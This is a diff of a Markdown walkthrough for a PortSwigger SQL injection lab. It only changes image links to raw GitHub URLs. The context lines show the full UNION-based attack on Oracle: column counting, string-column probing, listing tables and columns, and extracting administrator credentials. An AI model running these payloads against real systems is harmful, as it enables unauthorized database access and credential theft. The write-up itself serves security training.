@@ -8,19 +8,19 @@ Determine the number of columns returned by the original query.
 ' ORDER BY 1--
 ```
 
-![](./images/cbe08ef121b3_001.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/Examining_the_database_in_SQL_injection_attacks./images/cbe08ef121b3_001.png)
 
 ```text
 ' ORDER BY 2--
 ```
 
-![](./images/cbe08ef121b3_002.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/Examining_the_database_in_SQL_injection_attacks./images/cbe08ef121b3_002.png)
 
 ```text
 ' ORDER BY 3--
 ```
 
-![](./images/cbe08ef121b3_003.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/Examining_the_database_in_SQL_injection_attacks./images/cbe08ef121b3_003.png)
 
 ```text
 ' ORDER BY 3--                           → Returns an error message.
@@ -36,19 +36,19 @@ Discover the column that contains the data type string.
 
 `' UNION SELECT NULL, NULL-- `**returns an error message. Therefore you can make a guess that the database might be Oracle.**
 
-![](./images/cbe08ef121b3_004.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/Examining_the_database_in_SQL_injection_attacks./images/cbe08ef121b3_004.png)
 
 ```text
 ' UNION SELECT 'a', NULL FROM DUAL--
 ```
 
-![](./images/cbe08ef121b3_005.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/Examining_the_database_in_SQL_injection_attacks./images/cbe08ef121b3_005.png)
 
 ```text
 ' UNION SELECT NULL, 'a' FROM DUAL--
 ```
 
-![](./images/cbe08ef121b3_006.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/Examining_the_database_in_SQL_injection_attacks./images/cbe08ef121b3_006.png)
 
 ```text
 ' UNION SELECT 'a', NULL FROM DUAL--   →Returns a 200 status code' UNION SELECT NULL, 'a' FROM DUAL--   →Returns a 200 status code
@@ -64,11 +64,11 @@ Determine the table names.
 ' UNION SELECT TABLE_NAME, NULL FROM ALL_TABLES--
 ```
 
-![](./images/cbe08ef121b3_007.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/Examining_the_database_in_SQL_injection_attacks./images/cbe08ef121b3_007.png)
 
 Let’s find a table which contains usernames and passwords.
 
-![](./images/cbe08ef121b3_008.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/Examining_the_database_in_SQL_injection_attacks./images/cbe08ef121b3_008.png)
 
 Table name: `USERS_KDXGKJ`
 
@@ -80,7 +80,7 @@ Determine the column names of the table** **`USERS_KDXGKJ`**.**
 ' UNION SELECT COLUMN_NAME, NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'USERS_KDXGKJ'--
 ```
 
-![](./images/cbe08ef121b3_009.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/Examining_the_database_in_SQL_injection_attacks./images/cbe08ef121b3_009.png)
 
 **There are two columns in the table **`USERS_KDXGKJ`**.**
 
@@ -98,7 +98,7 @@ Retrieve the administrator user’s password from the database.
 ' UNION SELECT USERNAME_CSUMYK, PASSWORD_AIOQBO FROM USERS_KDXGKJ--
 ```
 
-![](./images/cbe08ef121b3_010.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/Examining_the_database_in_SQL_injection_attacks./images/cbe08ef121b3_010.png)
 
 |  |  |
 |---|---|
